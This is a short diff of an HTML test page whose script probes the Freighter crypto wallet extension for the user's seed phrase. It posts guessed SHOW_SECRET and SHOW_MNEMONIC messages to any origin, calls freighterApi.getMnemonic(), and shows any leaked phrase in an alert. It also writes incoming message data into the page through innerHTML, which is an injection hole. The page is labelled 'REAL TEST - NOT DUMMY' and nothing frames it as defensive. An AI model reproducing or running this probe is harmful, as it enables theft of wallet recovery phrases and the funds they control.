@@ -1,20 +1,18 @@
-<button id="btn">TRY TRIGGER BACKUP DISPLAY</button>
 <script>
-const payloads=[
-  {type:"SHOW_SECRET"},
-  {type:"SHOW_SECRET", request:{type:"SHOW_SECRET"}},
-  {method:"showBackup", type:"UI"},
-  {request:{type:"SHOW_MNEMONIC"}},
-  {id:1, type:"openBackupPhrase"},
-  {jsonrpc:"2.0", method:"showBackupPhrase"},
-];
-document.getElementById('btn').onclick=()=>{
-  payloads.forEach(p=> window.postMessage(p,"*"));
-  if(window.freighterApi && window.freighterApi.showBackup)
-    window.freighterApi.showBackup();
-};
-window.addEventListener('message',(e)=>{
-  if(JSON.stringify(e.data).toLowerCase().includes('mnemonic'))
-    alert('SEED LEAK FOUND!');
+window.addEventListener('message', e=>{
+  console.log('RECEIVED:', e.data);
+  document.body.innerHTML += `<pre>${JSON.stringify(e.data).slice(0,800)}</pre>`;
 });
+
+async function realTest(){
+  try{
+    const res = await window.freighterApi.getMnemonic(); // coba semua method
+    alert('REAL LEAK: ' + res);
+  }catch(err){
+    console.log('getMnemonic blocked:', err);
+  }
+  // coba via postMessage yang dulu CVE
+  window.postMessage({type:"SHOW_SECRET", origin:"freighter"}, "*");
+}
 </script>
+<button onclick="realTest()">REAL TEST - NOT DUMMY</button>
